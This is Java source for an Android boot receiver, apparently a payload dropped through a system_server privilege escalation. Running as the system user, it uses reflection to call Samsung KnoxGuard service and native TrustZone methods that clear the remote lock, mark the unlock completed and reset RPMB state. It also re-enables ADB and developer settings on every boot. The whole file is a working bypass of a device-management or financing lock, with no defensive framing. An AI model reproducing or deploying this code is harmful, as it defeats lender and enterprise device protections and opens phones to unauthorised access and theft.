package com.example.abxoverflow.droppedapk;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * Auto-runs KG unlock + ADB re-enable on every BOOT_COMPLETED.
 * Runs as UID 1000 inside system_server.
 */
public class LaunchReceiver extends BroadcastReceiver {
    private static final String TAG = "AbxBootUnlock";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.e(TAG, "BOOT_COMPLETED received. Running auto-unlock...");

        try {
            // Get KnoxGuard service
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method getService = sm.getMethod("getService", String.class);
            Object kgService = getService.invoke(null, "knoxguard_service");

            if (kgService != null) {
                // 1. setRemoteLockToLockscreen(false)
                try {
                    Method m = kgService.getClass().getDeclaredMethod("setRemoteLockToLockscreen", boolean.class);
                    m.setAccessible(true);
                    m.invoke(kgService, false);
                    Log.e(TAG, "setRemoteLockToLockscreen(false): OK");
                } catch (Exception e) { Log.e(TAG, "setRemoteLock failed: " + e.getMessage()); }

                // 2. unlockCompleted()
                try {
                    Method m = kgService.getClass().getDeclaredMethod("unlockCompleted");
                    m.setAccessible(true);
                    m.invoke(kgService);
                    Log.e(TAG, "unlockCompleted(): OK");
                } catch (Exception e) { Log.e(TAG, "unlockCompleted failed: " + e.getMessage()); }

                // 3. unbindFromLockScreen()
                try {
                    Method m = kgService.getClass().getDeclaredMethod("unbindFromLockScreen");
                    m.setAccessible(true);
                    m.invoke(kgService);
                    Log.e(TAG, "unbindFromLockScreen(): OK");
                } catch (Exception e) { Log.e(TAG, "unbindFromLockScreen failed: " + e.getMessage()); }

                // 4. tz_unlockScreen(0) via native
                try {
                    ClassLoader cl = kgService.getClass().getClassLoader();
                    Class<?> nativeClass = cl.loadClass("com.samsung.android.knoxguard.service.KnoxGuardNative");
                    Method unlock = nativeClass.getDeclaredMethod("tz_unlockScreen", int.class);
                    unlock.setAccessible(true);
                    unlock.invoke(null, 0);
                    Log.e(TAG, "tz_unlockScreen(0): OK");
                } catch (Exception e) { Log.e(TAG, "tz_unlockScreen failed: " + e.getMessage()); }

                // 5. tz_resetRPMB(0, new byte[0])
                try {
                    ClassLoader cl = kgService.getClass().getClassLoader();
                    Class<?> nativeClass = cl.loadClass("com.samsung.android.knoxguard.service.KnoxGuardNative");
                    Method reset = nativeClass.getDeclaredMethod("tz_resetRPMB", int.class, byte[].class);
                    reset.setAccessible(true);
                    reset.invoke(null, 0, new byte[0]);
                    Log.e(TAG, "tz_resetRPMB: OK");
                } catch (Exception e) { Log.e(TAG, "tz_resetRPMB failed: " + e.getMessage()); }
            }

            // 6. Re-enable ADB
            try {
                Settings.Global.putInt(context.getContentResolver(), Settings.Global.ADB_ENABLED, 1);
                Settings.Global.putInt(context.getContentResolver(), "development_settings_enabled", 1);
                Log.e(TAG, "ADB re-enabled: OK");
            } catch (Exception e) { Log.e(TAG, "ADB enable failed: " + e.getMessage()); }

            // 7. Set system property
            try {
                Class<?> sysProp = Class.forName("android.os.SystemProperties");
                Method set = sysProp.getMethod("set", String.class, String.class);
                set.invoke(null, "knox.kg.state", "Completed");
                Log.e(TAG, "sysprop Completed: OK");
            } catch (Exception e) { Log.e(TAG, "sysprop failed: " + e.getMessage()); }

        } catch (Exception e) {
            Log.e(TAG, "Auto-unlock failed: " + e.toString());
        }

        // Also start the Activity for visual feedback
        context.startActivity(new Intent(context, MainActivity.class)
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            .putExtra("action", 36));

        Log.e(TAG, "Auto-unlock sequence complete.");
    }
}
